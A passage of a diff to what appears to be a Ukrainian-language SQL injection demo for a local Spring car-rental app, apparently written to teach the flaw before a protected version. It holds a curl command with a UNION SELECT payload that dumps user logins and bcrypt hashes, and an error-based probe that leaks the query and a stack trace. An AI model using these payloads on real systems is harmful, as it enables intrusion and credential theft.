@@ -22,11 +22,11 @@ $ curl -s -G http://localhost:8080/demo/vuln/search --data-urlencode "brand=' UN
   HTTP 200
   SQL: SELECT brand, model, production_year, daily_price FROM cars WHERE brand = '' UNION SELECT login,password_hash,0,0 FROM users-- ' ORDER BY id
   | manager | $2a$10$OMIQiy/8WhB.wovMRigmk.9.9ohWa7lmSvjiVjdyDI.m1vhycZciK | 0 | 0.00
-  | attacker1 | $2a$10$jxS/qpF1e/jMQLo7BFIGO.0/P7cyvYQg3Rs1IzDi3DNjnMfC2Gyka | 0 | 0.00
+  | attacker1 | $2a$10$4mH6A4wd0cJSS1gSE/Q4teKJsPwiuz34FwDWSu2bK4gJl6FDPwsvS | 0 | 0.00
 
 # Одинарна лапка ламає запит: помилка розкриває SQL і внутрішні класи
 $ curl -s -G http://localhost:8080/demo/vuln/search --data-urlencode "brand='" | head -c 700
-{"timestamp":"2026-11-02T22:15:45.813+00:00","status":500,"error":"Internal Server Error","exception":"org.springframework.jdbc.BadSqlGrammarException","trace":"org.springframework.jdbc.BadSqlGrammarException: StatementCallback; bad SQL grammar [SELECT brand, model, production_year, daily_price FROM cars WHERE brand = ''' ORDER BY id]\n\tat org.springframework.jdbc.support.SQLExceptionSubclassTranslator.doTranslate(SQLExceptionSubclassTranslator.java:103)\n\tat org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:107)\n\tat org.springframework.jdbc.core.JdbcTemplate.translateException(JdbcTemplate.java:1548)\n\tat org.s ...
+{"timestamp":"2026-11-21T22:02:39.859+00:00","status":500,"error":"Internal Server Error","exception":"org.springframework.jdbc.BadSqlGrammarException","trace":"org.springframework.jdbc.BadSqlGrammarException: StatementCallback; bad SQL grammar [SELECT brand, model, production_year, daily_price FROM cars WHERE brand = ''' ORDER BY id]\n\tat org.springframework.jdbc.support.SQLExceptionSubclassTranslator.doTranslate(SQLExceptionSubclassTranslator.java:103)\n\tat org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:107)\n\tat org.springframework.jdbc.core.JdbcTemplate.translateException(JdbcTemplate.java:1548)\n\tat org.s ...
 
 Безпечний варіант (після захисту):
 
